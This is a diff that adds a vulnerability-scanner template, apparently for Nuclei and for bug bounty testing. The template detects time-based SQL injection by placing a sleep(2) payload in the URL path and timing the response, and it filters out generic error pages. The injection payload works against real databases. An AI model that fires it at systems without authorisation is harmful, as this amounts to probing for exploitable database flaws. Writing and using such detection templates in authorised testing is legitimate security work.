@@ -1,0 +1,40 @@
+id: bugbounty-timebased-sqli-in-path
+
+info:
+  name: Time-Based SQLi via Path (delay ≥ 1.8s, excludes generic error pages)
+  author: Justin Washek
+  severity: high
+  description: |
+    Triggers SQLi via URI path and checks for 2s delay, filtering out generic error pages.
+  tags: sqli,time,path,delay,bugbounty
+
+variables:
+  payload: "'+(select*from(select(sleep(2)))a)+'"
+
+requests:
+  - method: GET
+    path:
+      - "{{BaseURL}}/{{payload}}"
+
+    matchers-condition: and
+    matchers:
+      - type: dsl
+        dsl:
+          - duration >= 1.8
+
+      - type: word
+        part: body
+        negative: true
+        words:
+          - "An error occurred while processing your request"
+          - "500 Internal Server Error"
+          - "Exception"
+          - "Oops!"
+          - "Something went wrong"
+          - "Access Denied"
+          - "Sorry, service unavailable"
+
+    extractors:
+      - type: dsl
+        dsl:
+          - duration
